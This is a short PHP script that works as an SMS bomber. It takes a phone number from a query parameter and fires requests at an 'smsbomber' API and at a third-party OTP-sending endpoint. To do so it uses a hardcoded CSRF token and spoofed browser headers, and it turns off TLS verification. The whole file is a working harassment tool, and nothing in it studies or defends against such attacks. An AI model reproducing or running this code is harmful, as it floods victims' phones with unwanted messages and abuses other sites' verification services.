<?php

if (isset($_GET['number']) && !empty($_GET['number'])) {
    
    $number = trim($_GET['number']);
    $jsonPayload1 = json_encode([
        "count"        => 10,
        "country_code" => "91",
        "csrf_token"   => "18c22cc84b4a6c33079909711fe9027a0f8ababe31fed5024e3d364b91841ae0",
        "curr_count"   => 0,
        "mobile"       => $number,
        "request_type" => "sms_bomber"
    ]);

    $url1 = "https://greatonlinetools.com/smsbomber/endpoints/api/receive_number.php";

    $ch1 = curl_init($url1);
    curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch1, CURLOPT_POST, true);
    curl_setopt($ch1, CURLOPT_POSTFIELDS, $jsonPayload1);
    curl_setopt($ch1, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "X-Requested-With: XMLHttpRequest",
        "Origin: https://greatonlinetools.com",
        "Referer: https://greatonlinetools.com/smsbomber/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    ]);
    curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch1, CURLOPT_TIMEOUT, 15);

    $postData2 = http_build_query([
        'mobilenumber' => $number,
        'email'        => 'test@example.com'
    ]);

    $url2 = "https://www.phonebazaar.info/send-otp.php";

    $ch2 = curl_init($url2);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_POST, true);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, $postData2);
    curl_setopt($ch2, CURLOPT_HTTPHEADER, [
        "Content-Type: application/x-www-form-urlencoded"
    ]);
    curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch2, CURLOPT_TIMEOUT, 15);
    $mh = curl_multi_init();
    curl_multi_add_handle($mh, $ch1);
    curl_multi_add_handle($mh, $ch2);

    $running = null;
    do {
        curl_multi_exec($mh, $running);
        usleep(10000);
    } while ($running > 0);

    curl_multi_remove_handle($mh, $ch1);
    curl_multi_remove_handle($mh, $ch2);
    curl_multi_close($mh);
    echo json_encode([
        "status"  => "success",
        "message" => "Request sent successfully",
        "number"  => $number
    ]);

} else {
    echo json_encode([
        "status"  => "error",
        "message" => "Phone number is required"
    ]);
}
?>
